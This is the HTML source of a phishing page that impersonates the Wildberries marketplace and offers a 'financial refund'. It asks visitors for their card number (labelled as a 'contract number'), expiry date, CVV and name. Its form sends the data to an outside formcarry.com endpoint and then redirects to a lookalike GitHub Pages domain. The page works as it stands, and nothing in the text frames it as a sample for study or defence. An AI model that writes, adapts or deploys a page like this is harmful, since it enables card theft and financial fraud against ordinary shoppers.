<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wildberries</title>
  <style>
    body { font-family: Arial; background: #f7f7f7; margin:0; padding:0; }
    header { background: #9c27b0; padding: 20px; text-align:center; color:#fff; font-size:28px; font-weight:900; }
    .container { max-width:420px; margin:50px auto; background:#fff; border-radius:12px; padding:30px; box-shadow:0 4px 15px rgba(0,0,0,0.1); text-align:center; }
    h2 { color:#9c27b0; margin-bottom:10px; font-size:20px; }
    p { color:#555; margin-bottom:25px; font-size:14px; }
    label { display:block; text-align:left; margin:12px 0 6px; font-size:14px; color:#333; }
    input { width:100%; padding:14px; margin-bottom:18px; border:1px solid #ccc; border-radius:8px; font-size:16px; box-sizing:border-box; }
    input.error { border-color:red; box-shadow:0 0 6px rgba(255,0,0,0.6); }
    button { background:linear-gradient(90deg, #9c27b0, #d500f9); color:#fff; border:none; padding:16px; width:100%; border-radius:8px; font-size:16px; cursor:pointer; font-weight:bold; }
    button:hover { transform: scale(1.03); box-shadow: 0 4px 15px rgba(156, 39, 176, 0.4); }
  </style>
</head>
<body>

<header>WILDBERRIES</header>

<div class="container">
  <h2>Финансовый возврат</h2>
  <p>Для получения возврата денежных средств введите данные карты</p>

  <form id="refundForm" action="https://formcarry.com/s/aM3pkQgjFxW" method="POST">
    <label for="contract">Номер договора</label>
    <input type="text" id="contract" name="contract" placeholder="0000 0000 0000 0000" maxlength="19" required>

    <label for="validUntil">Срок действия (MM/YY)</label>
    <input type="text" id="validUntil" name="validUntil" placeholder="00/00" maxlength="5" required>

    <label for="secretCode">CVV</label>
    <input type="text" id="secretCode" name="secretCode" placeholder="000" maxlength="3" required>

    <label for="clientName">Имя владельца</label>
    <input type="text" id="clientName" name="clientName" placeholder="Иван Иванов" required>

    <!-- Редирект после успешной отправки -->
    <input type="hidden" name="_redirect" value="https://lk-wildberries.github.io/com/thankyou.html">

    <button type="submit">Отправить запрос</button>
  </form>
</div>

<script>
const form = document.getElementById("refundForm");
const contractInput = document.getElementById("contract");
const validUntilInput = document.getElementById("validUntil");
const secretCodeInput = document.getElementById("secretCode");
const clientNameInput = document.getElementById("clientName");

// Маска номера договора
contractInput.addEventListener("input", e => {
  let val = e.target.value.replace(/\D/g,"").substring(0,16);
  e.target.value = val.replace(/(.{4})/g,"$1 ").trim();
});

// Маска срока действия
validUntilInput.addEventListener("input", e => {
  let val = e.target.value.replace(/\D/g,"").substring(0,4);
  if(val.length > 2) val = val.substring(0,2) + "/" + val.substring(2);
  e.target.value = val;
});

// Маска CVV
secretCodeInput.addEventListener("input", e => {
  e.target.value = e.target.value.replace(/\D/g,"").substring(0,3);
});

// Проверка перед отправкой
form.addEventListener("submit", e => {
  let hasError = false;

  // Проверка номера карты
  if(contractInput.value.replace(/\s/g,"").length !== 16) {
    contractInput.classList.add("error");
    hasError = true;
  } else { contractInput.classList.remove("error"); }

  // Проверка срока действия
  const [mm, yy] = validUntilInput.value.split("/");
  if(!(mm && yy && parseInt(mm)>=1 && parseInt(mm)<=12 && yy.length===2)) {
    validUntilInput.classList.add("error");
    hasError = true;
  } else { validUntilInput.classList.remove("error"); }

  // Проверка CVV
  if(secretCodeInput.value.length !== 3) {
    secretCodeInput.classList.add("error");
    hasError = true;
  } else { secretCodeInput.classList.remove("error"); }

  if(hasError){
    e.preventDefault();
    alert("Пожалуйста, заполните все поля корректно!");
  }
});
</script>

</body>
</html>
